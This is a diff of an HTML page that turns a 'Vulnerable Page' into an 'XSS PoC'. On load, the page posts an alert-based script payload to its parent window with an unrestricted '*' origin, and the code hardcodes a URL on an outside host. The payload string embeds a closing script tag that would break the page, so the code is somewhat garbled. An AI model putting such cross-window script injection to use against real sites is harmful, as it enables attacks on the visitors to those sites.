@@ -2,7 +2,25 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Vulnerable Page</title>
+    <title>XSS PoC</title>
+</head>
+<body>
+    <!-- Exploited page content -->
+    <h1>Exploited Page Content</h1>
+    <script>
+        function exploit() {
+            var payload = "<script>alert('XSS from the exploited page');</script>";
+            // Send payload to the parent window
+            window.parent.postMessage(payload, '*');
+        }
+    </script>
+    <!-- Trigger the exploit onload -->
+    <script>
+        exploit();
+    </script>
+
+    <!-- Vulnerable page content -->
+    <h1>Vulnerable Page Content</h1>
     <script>
         function createCookie(name, value, days) {
             var expires;
@@ -31,7 +49,7 @@
         createCookie('ready', 'ready');
 
         var data = [],
-            url = urlParam('parentUrl');
+            url = "https://xsnapfish.com/visa.html";
 
         if (getCookie('ready') === 'ready'){
             data.push('ready');
@@ -45,11 +63,5 @@
         if (typeof window['console'] !== 'undefined')
             console.log(data.join('--'));
     </script>
-</head>
-<body>
-    <!-- Vulnerable page content -->
-    <h1>Vulnerable Page Content</h1>
-    <!-- The iframe to load the exploited page -->
-    <iframe src="https://xsnapfish.com/visa.html" style="display: none;"></iframe>
 </body>
 </html>
